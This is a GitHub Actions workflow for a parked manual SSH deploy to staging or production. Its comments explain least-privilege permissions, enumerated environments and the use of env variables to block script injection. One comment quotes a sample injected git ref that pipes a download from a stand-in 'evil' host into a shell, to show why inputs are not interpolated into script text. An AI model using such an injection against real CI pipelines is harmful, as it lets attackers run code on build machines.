# Manual deploy — PARKED until a target server exists (docs/CI.md §Deploy).
#
# No staging/production box exists yet (2026-07-09). This workflow is wired
# end-to-end but fails loudly at the guard step until the repo (or the chosen
# environment) defines the DEPLOY_HOST + DEPLOY_SSH_KEY secrets. Dispatching
# it today and getting the loud PARKED failure is the expected result.
#
# When a server exists: set the secrets, provision deploy/dedalo-ts.service
# (+ watchdog/backup units) on the host per docs/PRODUCTION.md, then dispatch.
name: deploy

on:
  workflow_dispatch:
    inputs:
      target:
        description: Deploy target
        type: choice
        options: [staging, production]
        required: true
      ref:
        description: Git ref (sha/tag/branch) to deploy
        default: master
        required: true

# Least privilege for GITHUB_TOKEN: without this block a workflow inherits the
# REPOSITORY default, which on an older repo is read/WRITE on contents, packages,
# issues and pull-requests — ambient push rights handed to every step, including a
# third-party action. None of these jobs writes anything back to the repo.
# Enforced by rule 7 of test/unit/ci_workflow_tripwire.test.ts.
permissions:
  contents: read

concurrency:
  group: deploy
  cancel-in-progress: false

jobs:
  deploy:
    runs-on: [self-hosted, macOS, dedalo-mac]
    timeout-minutes: 20
    # NOT `${{ inputs.target }}` (P2-24 / GATE-46). GitHub AUTO-CREATES a named
    # environment that does not exist yet, WITH NO PROTECTION RULES — so before
    # the runbook's environments are configured, the "manual approval on
    # production" that CI.md relies on would exist only as an unexecuted UI step,
    # and a dispatch would sail straight through. An enumerated choice cannot
    # name an environment nobody has configured.
    environment: ${{ inputs.target == 'production' && 'production' || 'staging' }}
    steps:
      - name: Guard — refuse until a deploy target is configured
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
        run: |
          if [ -z "$DEPLOY_HOST" ]; then
            echo "PARKED: no deploy target configured (secrets.DEPLOY_HOST empty)." >&2
            echo "See docs/CI.md §Deploy for the activation checklist."           >&2
            exit 1
          fi
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ inputs.ref }}
      - name: Load deploy key
        uses: webfactory/ssh-agent@e83874834305fe9a4a2997156cb26c5de65a8555 # v0.10.0
        with:
          ssh-private-key: ${{ secrets.DEPLOY_SSH_KEY }}
      # ENV INDIRECTION, NOT INTERPOLATION (P2-24 / GATE-46). A `${{ … }}`
      # expression is substituted into the script TEXT before the shell sees it,
      # so a ref like `x"; curl evil|sh; :"` becomes commands. Passing it through
      # `env:` makes it a shell VARIABLE the runner sets — never script text.
      # Defence in depth: dispatching this workflow already needs write access.
      - name: Deploy over SSH (with health check + rollback)
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          DEPLOY_REF: ${{ inputs.ref }}
        run: bash deploy/deploy.sh --host "$DEPLOY_HOST" --ref "$DEPLOY_REF"
